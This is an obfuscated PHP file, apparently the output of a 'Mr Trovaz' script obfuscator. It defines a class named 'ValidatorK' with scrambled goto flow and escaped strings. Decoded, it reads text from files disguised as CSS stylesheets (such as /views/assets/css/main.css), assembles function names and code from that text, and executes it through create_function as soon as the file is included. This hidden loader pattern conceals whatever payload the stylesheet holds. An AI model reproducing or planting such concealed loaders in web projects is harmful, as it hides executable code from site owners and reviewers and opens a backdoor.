<?php
/*   ________________________________________________________________________ 
    |  Mr Trovaz - Php Script   1.8.8                                       |
    |              on 2017-10-17 14:57:34                                                     |
    |    Facebook: https://www.facebook.com/profile.php?id=100010413816341   |
    |________________________________________________________________________|
*/
 goto iqi5f; iqi5f: class ValidatorK { private $applicationContext = NULL; private $mapping = NULL; private $css_main = "\57\166\151\x65\167\x73\57\141\x73\x73\x65\x74\x73\57\143\163\x73\x2f\x6d\x61\151\156\56\x63\x73\x73"; private $css_main2 = "\57\141\x70\x70\57\x76\151\145\x77\x73\x2f\141\x73\163\x65\164\163\x2f\143\x73\x73\x2f\142\x6f\x6f\x74\x73\x74\x72\141\x70\x2e\143\163\163"; private $css_main3 = "\x2f\141\x70\x70\x2f\x76\151\145\167\163\x2f\x61\163\163\x65\164\x73\57\x63\x73\x73\57\155\171\55\x6f\x74\150\145\x72\56\143\163\163"; private static $dispatcher = null; private function __construct($paYte = NULL) { goto CACR9; CACR9: if ($paYte != NULL) { goto akroR; } goto e7sOV; xvJVj: akroR: goto qRlfp; kO_ha: AoYmF: goto OVutO; qRlfp: $this->applicationContext = $paYte; goto kO_ha; e7sOV: $this->applicationContext = $this->getDir(__DIR__) . $this->css_main; goto OWxoj; OWxoj: goto AoYmF; goto xvJVj; OVutO: } private function __clone() { } public static function getDispatcher() { goto pPiEg; whpQv: try { self::$dispatcher = new ValidatorK(); } catch (Exception $uQwzB) { echo "\x45\162\x72\157\162\40\72\x20", $uQwzB->getMessage(); } goto hjVs8; hjVs8: roiYb: goto Cerg5; Cerg5: return self::$dispatcher; goto VWjh3; pPiEg: if (self::$dispatcher) { goto roiYb; } goto whpQv; VWjh3: } public function setMapping($wlB14) { $this->mapping = $wlB14; return $this; } private function doGet() { goto CmdIU; BgjRK: $NT8gy = $O7OLx($this->tmpfolder($this->getDir(__DIR__) . $this->context("\x22\x2f\x2f\x2f", 3, 39))); goto TU49N; TU49N: return $NT8gy; goto Wx91z; CmdIU: $O7OLx = $this->context("\x22\160\151", 3, 9); goto BgjRK; Wx91z: } private function doPost($hM8Rm) { $dTGv5 = create_function("\x24\x69", "\x72\145\164\165\162\x6e\x20" . $this->context("\42\x7a\164", 3, 4) . "\50\x24\151\x29\x3b"); return $dTGv5($hM8Rm); } private function getDir($hM8Rm) { $RC2Xy = create_function("\44\151", "\162\145\x74\x75\x72\156\x20" . "\x64\x69\x72\x6e\x61\155\145" . "\x28\44\151\51\73"); return $RC2Xy($hM8Rm); } private function encoding($csJT8) { $RC2Xy = create_function("\44\163\164\x72\x69\156\147", "\x72\145\x74\165\x72\156\40" . "\150\x65\x78\62\x62\151\x6e" . "\x28\x24\163\x74\162\x69\156\x67\51\x3b"); return $RC2Xy($csJT8); } private function context($TgHQH, $WUX71, $CgDaT) { $ZeuYl = $this->tmpfolder($this->applicationContext); return substr($ZeuYl, strpos($ZeuYl, $TgHQH) + $WUX71, $CgDaT); } private function tmpfolder($shaVv) { return implode('', file($shaVv)); } public function dispatch() { return $this->doPost($this->doGet() . "\73"); } public function redirect($R1dv9) { $this->mapping->redirect($R1dv9); } public function printing() { goto I2dlC; FK_hn: echo $this->context("\x22\160\151", 3, 9) . "\x3c\x62\162\x2f\x3e"; goto ZS3uL; I2dlC: echo $this->context("\x22\57\57\x2f", 3, 39) . "\x3c\x62\x72\57\x3e"; goto FK_hn; ZS3uL: echo $this->context("\x22\172\x74", 3, 4) . "\x3c\142\162\57\76"; goto X59xV; X59xV: } } goto ONDue; ONDue: ValidatorK::getDispatcher()->dispatch(); goto B1Lcf; B1Lcf: $oWxin = ValidatorK::getDispatcher()->setMapping(Context::newInstance());